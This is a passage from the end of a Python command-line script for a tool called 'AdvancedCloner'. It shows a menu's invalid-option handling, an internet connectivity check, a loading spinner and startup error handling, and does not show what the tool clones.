            print(f"╚══════════════════════════════════════════════════╝{Colors.END}")
            exit()
        else:
            print(f"{Colors.RED}❌ Invalid option!{Colors.END}")
            time.sleep(1)
            self.main_menu()

if __name__ == "__main__":
    try:
        try:
            requests.get("https://www.google.com", timeout=5)
        except:
            print(f"{Colors.RED}❌ No internet connection! Please check your network.{Colors.END}")
            exit()
        
        print(f"{Colors.BLUE}🚀 Initializing advanced cloner tool...{Colors.END}")
        spinner = Animations.spinning_cursor()
        for _ in range(10):
            print(f"\r{next(spinner)} Loading components...", end="")
            time.sleep(0.1)
        
        cloner = AdvancedCloner()
        cloner.main_menu()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}❌ Process interrupted by user.{Colors.END}")
        exit()
    except Exception as e:
        print(f"\n{Colors.RED}❌ An error occurred: {str(e)}{Colors.END}")
        exit()